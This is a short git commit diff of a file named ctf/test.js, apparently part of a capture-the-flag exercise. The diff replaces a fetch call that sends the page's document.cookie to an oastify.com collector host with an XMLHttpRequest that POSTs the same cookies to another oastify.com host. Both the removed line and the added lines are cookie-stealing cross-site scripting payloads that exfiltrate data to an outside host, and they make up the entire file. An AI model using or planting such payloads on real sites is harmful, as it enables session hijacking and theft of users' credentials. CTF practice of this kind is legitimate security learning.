451c86649a725302e2ca60963f58cfcc1b6e6e5a
Saurabh <skumar1@mt.iitr.ac.in>
2022-09-21 00:35:55 +0530

    Update test.js

--- ctf/test.js
+++ ctf/test.js
@@ -1,1 +1,8 @@
-fetch('http://ji52u4ahnvtxnb51u9vo2mckzb51tq.oastify.com/'+document.cookie);
+const xhr = new XMLHttpRequest();
+xhr.open("POST", 'http://3aemmo21fflhfvxlmtn8u644rvxmlb.oastify.com', true);
+let ck = document.cookie;
+xhr.onreadystatechange = () => { 
+  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+  }
+}
+xhr.send(ck);
